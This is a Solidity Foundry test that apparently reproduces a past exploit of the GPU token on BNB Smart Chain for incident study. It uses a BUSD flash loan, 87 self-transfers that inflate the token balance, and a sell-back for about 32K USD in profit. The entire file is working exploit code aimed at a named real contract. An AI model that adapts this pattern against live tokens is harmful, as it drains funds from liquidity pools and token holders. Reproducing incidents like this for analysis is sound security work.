// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~32K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb
// GUY : https://twitter.com/PeckShieldAlert/status/1788153869987611113
// Vuln Contract: https://bscscan.com/address/0xf51cbf9f8e089ca48e454eb79731037a405972ce

contract GPUExploit is Test {
    IERC20 private gpuToken;
    IERC20 private busd;
    IUniswapV2Pair private busdWbnbPair;
    IUniswapV2Router private router;

    modifier balanceLog() {
        emit log_named_decimal_uint("Attacker BUSD Balance Before exploit", getBalance(busd), 18);
        _;
        emit log_named_decimal_uint("Attacker BUSD Balance After exploit", getBalance(busd), 18);
    }

    function setUp() external {
        vm.createSelectFork("bsc", 38_539_572);
        gpuToken = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);
        busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
        busdWbnbPair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
        router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        busd.approve(address(router), type(uint256).max);
        gpuToken.approve(address(router), type(uint256).max);
    }

    function testExploit() public balanceLog {
        busdWbnbPair.swap(22_600 ether, 0, address(this), "0x42");
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Define the swap paths
        address[] memory buyPath = getPath(address(busd), address(gpuToken));
        address[] memory sellPath = getPath(address(gpuToken), address(busd));

        uint256 amountOut = router.getAmountsOut(amount0, buyPath)[1];

        router.swapExactTokensForTokens(amount0, amountOut, buyPath, address(this), block.timestamp);

        for (uint256 i = 0; i < 87; i++) {
            selfTransfer(gpuToken);
        }

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            type(uint112).max, 1, sellPath, address(this), block.timestamp
        );
        //Payback flashloan
        uint256 feeAmount = (amount0 * 3) / 1000 + 1;
        busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
    }

    function getBalance(IERC20 token) private view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function selfTransfer(IERC20 token) internal {
        transferTokens(gpuToken, address(this), getBalance(gpuToken));
    }

    function transferTokens(IERC20 token, address recipient, uint256 amount) private {
        token.transfer(recipient, amount);
    }
}
